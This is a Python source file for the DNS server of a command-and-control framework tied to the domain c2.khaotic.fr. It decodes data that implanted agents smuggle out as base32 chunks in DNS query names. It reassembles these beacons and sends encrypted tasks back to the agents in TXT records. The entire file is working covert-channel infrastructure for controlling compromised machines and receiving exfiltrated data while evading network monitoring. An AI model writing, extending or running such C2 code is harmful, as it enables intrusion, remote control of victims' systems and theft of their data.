"""
Authoritative DNS server for the DoH C2 channel.

Listens on UDP port 53 for queries delegated from c2.khaotic.fr.

RECEIVE (agent → server):
  Agent chunks the b64 payload as base32 DNS labels:
    {b32chunk}.{seq:02d}.out.{agent_id}.c2.khaotic.fr
  Sentinel when done:
    done.99.out.{agent_id}.c2.khaotic.fr
  Server reassembles chunks, decodes, routes through agent_manager.

SEND (server → agent):
  Server populates dns_pending_tasks[agent_id] = b64_encrypted_task
  Agent queries: cmd.{agent_id}.c2.khaotic.fr  (TXT)
  Server returns the task as TXT record (TTL=10s).
  After task ACK the entry is cleared.

Integration:
  dns_pending_tasks is a module-level dict shared with channel_reader.
  channel_reader writes tasks into it; DNS server reads and clears.
"""

import asyncio
import base64
import logging
import re
from typing import Optional

from dnslib import DNSRecord, RR, QTYPE, TXT

logger = logging.getLogger("dns_server")

# Shared pending tasks: {agent_id: b64_encrypted_task}
# Written by channel_reader, read and cleared by dns_server on delivery.
dns_pending_tasks: dict[str, str] = {}

# In-flight beacon chunks: {agent_id: {seq: b32_chunk_str}}
_chunk_store: dict[str, dict[int, str]] = {}


class C2DnsProtocol(asyncio.DatagramProtocol):
    """Asyncio UDP handler — one instance per listening socket."""

    def __init__(self, domain: str, db_factory):
        self.domain      = domain.lower().rstrip(".")
        self.db_factory  = db_factory
        self.transport: Optional[asyncio.DatagramTransport] = None

        esc = re.escape(self.domain)
        # cmd.{8hex}.{domain}
        self._re_cmd  = re.compile(
            r"^cmd\.([a-f0-9]{8})\." + esc + r"\.?$", re.IGNORECASE
        )
        # {b32}.{seq}.out.{8hex}.{domain}
        self._re_out  = re.compile(
            r"^([a-z2-7]+)\.(\d+)\.out\.([a-f0-9]{8})\." + esc + r"\.?$",
            re.IGNORECASE,
        )
        # done.99.out.{8hex}.{domain}
        self._re_done = re.compile(
            r"^done\.99\.out\.([a-f0-9]{8})\." + esc + r"\.?$",
            re.IGNORECASE,
        )

    def connection_made(self, transport: asyncio.DatagramTransport):
        self.transport = transport
        logger.info("DNS server ready on UDP :53 for %s", self.domain)

    def datagram_received(self, data: bytes, addr: tuple):
        try:
            request = DNSRecord.parse(data)
            reply   = request.reply()
            qname   = str(request.q.qname).rstrip(".")
            qtype   = request.q.qtype

            if qtype == QTYPE.TXT:
                self._handle_txt(qname, reply)

            self.transport.sendto(reply.pack(), addr)
        except Exception as e:
            logger.debug("DNS datagram error from %s: %s", addr, e)

    def _handle_txt(self, qname: str, reply: DNSRecord):
        # ---- cmd query → return pending task ----
        m = self._re_cmd.match(qname)
        if m:
            agent_id = m.group(1).lower()
            task = dns_pending_tasks.get(agent_id)
            if task:
                reply.add_answer(
                    RR(qname, QTYPE.TXT, rdata=TXT(task.encode()), ttl=10)
                )
                logger.info("DNS: task delivered to %s via TXT", agent_id)
            return

        # ---- done sentinel → reassemble beacon ----
        m = self._re_done.match(qname)
        if m:
            agent_id = m.group(1).lower()
            asyncio.ensure_future(self._reassemble(agent_id))
            return

        # ---- data chunk → store ----
        m = self._re_out.match(qname)
        if m:
            chunk    = m.group(1).lower()
            seq      = int(m.group(2))
            agent_id = m.group(3).lower()
            if agent_id not in _chunk_store:
                _chunk_store[agent_id] = {}
            _chunk_store[agent_id][seq] = chunk
            logger.debug("DNS: chunk seq=%d stored for %s", seq, agent_id)

    async def _reassemble(self, agent_id: str):
        chunks = _chunk_store.pop(agent_id, {})
        if not chunks:
            logger.warning("DNS: reassemble called but no chunks for %s", agent_id)
            return

        # Sort by seq → base32-decode each chunk → join → recover b64 payload
        parts: list[bytes] = []
        for seq in sorted(chunks.keys()):
            raw = chunks[seq].upper()
            # Pad to multiple of 8 for stdlib base32
            pad = (8 - len(raw) % 8) % 8
            try:
                parts.append(base64.b32decode(raw + "=" * pad))
            except Exception as e:
                logger.warning("DNS: b32 decode error seq=%d agent=%s: %s", seq, agent_id, e)
                return

        b64_payload = b"".join(parts).decode("ascii", errors="replace")
        logger.info("DNS: reassembled beacon for %s (%d chars)", agent_id, len(b64_payload))

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._process_beacon, agent_id, b64_payload)

    def _process_beacon(self, agent_id: str, b64_payload: str):
        from services.agent_manager import manager

        db = self.db_factory()
        try:
            pkt_type = _detect_type(b64_payload)

            if pkt_type == "h":
                resp = manager.process_handshake(b64_payload, db)
                if resp:
                    dns_pending_tasks[agent_id] = resp
            else:
                manager.process_beacon(agent_id, b64_payload, db)
                task_pkt = manager.get_pending_task_packet(agent_id, db)
                if task_pkt:
                    dns_pending_tasks[agent_id] = task_pkt
                else:
                    session = manager.get_session(agent_id)
                    if session and session.crypto.ready:
                        dns_pending_tasks[agent_id] = session.crypto.seal_json({"t": "n"})

        except Exception as e:
            logger.error("DNS: process_beacon error agent=%s: %s", agent_id, e)
        finally:
            db.close()


def _detect_type(b64: str) -> str:
    import json as _json
    try:
        raw     = base64.b64decode(b64)
        payload = _json.loads(raw.decode())
        return payload.get("t", "encrypted")
    except Exception:
        return "encrypted"


async def start_dns_server(domain: str, db_factory,
                            host: str = "0.0.0.0", port: int = 53):
    """
    Start the UDP DNS server.
    Returns the asyncio transport (call transport.close() to stop).
    Port 53 requires root or cap_net_bind_service on Linux.
    """
    loop = asyncio.get_event_loop()
    transport, _ = await loop.create_datagram_endpoint(
        lambda: C2DnsProtocol(domain, db_factory),
        local_addr=(host, port),
        family=__import__("socket").AF_INET,
    )
    return transport
